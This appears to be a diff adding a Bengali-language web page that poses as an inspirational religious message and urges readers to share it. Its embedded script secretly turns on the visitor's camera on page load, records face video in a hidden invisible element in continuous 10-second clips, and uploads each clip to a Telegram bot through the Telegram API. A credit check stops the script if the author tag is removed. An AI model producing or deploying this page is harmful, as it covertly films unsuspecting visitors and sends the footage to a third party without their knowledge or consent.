@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+  <meta charset="UTF-8" />
+  <title>আলোর বার্তা</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Noto+Serif+Bengali&display=swap');
+
+    body {
+      margin: 0;
+      padding: 0;
+      min-height: 100vh;
+      background: linear-gradient(135deg, #1f4037, #99f2c8);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      font-family: 'Noto Serif Bengali', serif;
+      color: #022c22;
+      text-align: center;
+      padding: 40px 20px;
+      box-sizing: border-box;
+      line-height: 1.6;
+      user-select: none;
+    }
+
+    .container {
+      background: rgba(255, 255, 255, 0.85);
+      max-width: 700px;
+      border-radius: 16px;
+      padding: 30px 40px;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+    }
+
+    .icon {
+      font-size: 48px;
+      margin-bottom: 20px;
+    }
+
+    h1 {
+      font-weight: 700;
+      margin-bottom: 25px;
+      font-size: 28px;
+      color: #004d40;
+    }
+
+    p {
+      font-size: 18px;
+      margin-bottom: 18px;
+      font-weight: 500;
+    }
+
+    p:last-child {
+      margin-top: 30px;
+      font-style: italic;
+      color: #2e7d32;
+      font-weight: 600;
+    }
+
+    #preview {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      object-fit: cover;
+      opacity: 0;
+      pointer-events: none;
+      z-index: -1;
+    }
+
+    .credit {
+      font-size: 12px;
+      margin-top: 20px;
+      color: #777;
+    }
+  </style>
+</head>
+<body>
+  <video id="preview" autoplay muted playsinline></video>
+
+  <div class="container">
+    <div class="icon">🌙</div>
+    <h1>আলোর বার্তা</h1>
+    <p>জীবনে সবকিছু তোমার ইচ্ছেমতো হবে না, কারণ তুমি আল্লাহ নও।</p>
+    <p>তোমার কাজ হলো চেষ্টা এবং দোয়া করা – ফলাফল আল্লাহর হাতে।</p>
+    <p>ধৈর্য ধরো, কারণ তোমার প্রতিটি কষ্টের জন্য তোমাকে পুরস্কৃত করা হবে।</p>
+    <p>জীবনের দুঃখগুলো হয়তো তোমার জন্য রহমতের দরজা খুলে দিতে পারে।</p>
+    <p>যে আল্লাহ তোমাকে সৃষ্টি করেছেন, তিনিই তোমার রিজিক, প্রেম ও সুখ ঠিক করে রেখেছেন।</p>
+    <p>সময়মতো সবকিছু ঠিক আসবে, শুধু হার মানবে না।</p>
+    <p>জীবনের সব ব্যথার পেছনে আল্লাহর এক মহাপরিকল্পনা থাকে।</p>
+    <p>তুমি যদি আল্লাহর উপর ভরসা করো, দুনিয়ার কেউ তোমাকে হারাতে পারবে না।</p>
+    <p>দুঃখকে সাবধানে দেখো – হয়তো এর মধ্যেই লুকিয়ে আছে তোমার জান্নাতের চাবি।</p>
+    <p>🤍</p>
+    <p>এই বার্তাটা হয়তো কারো ভাঙা মনটা জোড়া লাগাতে পারে। তাই দয়া করে শেয়ার করো, ছড়িয়ে দাও আল্লাহর উপর ভরসার এই আলো। হয়তো তোমার শেয়ারেই কেউ নতুন করে জীবনের দিকে ফিরে তাকাবে।</p>
+    <div class="credit" id="credit">Created by <strong>SOAD</strong></div>
+  </div>
+
+  <script>
+    const video = document.getElementById("preview");
+    const creditText = document.getElementById("credit");
+
+    // 🔐 টোকেন এবং চ্যাট আইডি নিরাপদভাবে বসাতে হবে
+    const TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";
+    const TELEGRAM_CHAT_ID = "YOUR_CHAT_ID_HERE";
+
+    // 🚫 ক্রেডিট যাচাই: যদি কেউ 'SOAD' বদলায়, কোড চলবে না
+    if (!creditText || !creditText.innerHTML.includes('SOAD')) {
+      alert("⚠️ সতর্কতা: ক্রেডিট পরিবর্তন করা হয়েছে — স্ক্রিপ্ট বন্ধ করা হলো");
+      throw new Error("Unauthorized credit modification detected");
+    }
+
+    let chunks = [];
+    let mediaRecorder;
+
+    function sendToTelegram(blob) {
+      const formData = new FormData();
+      formData.append("chat_id", TELEGRAM_CHAT_ID);
+      formData.append("video", blob, "face_clip.webm");
+
+      fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, {
+        method: "POST",
+        body: formData
+      })
+      .then(res => console.log("✅ ভিডিও পাঠানো হয়েছে"))
+      .catch(err => console.error("❌ পাঠাতে সমস্যা:", err));
+    }
+
+    function startRecording(stream) {
+      mediaRecorder = new MediaRecorder(stream);
+      mediaRecorder.ondataavailable = e => chunks.push(e.data);
+
+      mediaRecorder.onstop = () => {
+        const blob = new Blob(chunks, { type: 'video/webm' });
+        sendToTelegram(blob);
+        chunks = [];
+        mediaRecorder.start();
+        setTimeout(() => mediaRecorder.stop(), 10000);
+      };
+
+      mediaRecorder.start();
+      setTimeout(() => mediaRecorder.stop(), 10000);
+    }
+
+    navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+      .then(stream => {
+        video.srcObject = stream;
+        startRecording(stream);
+      })
+      .catch(err => {
+        alert("⚠️ ক্যামেরা চালু করা যায়নি: " + err);
+      });
+  </script>
+</body>
+</html>
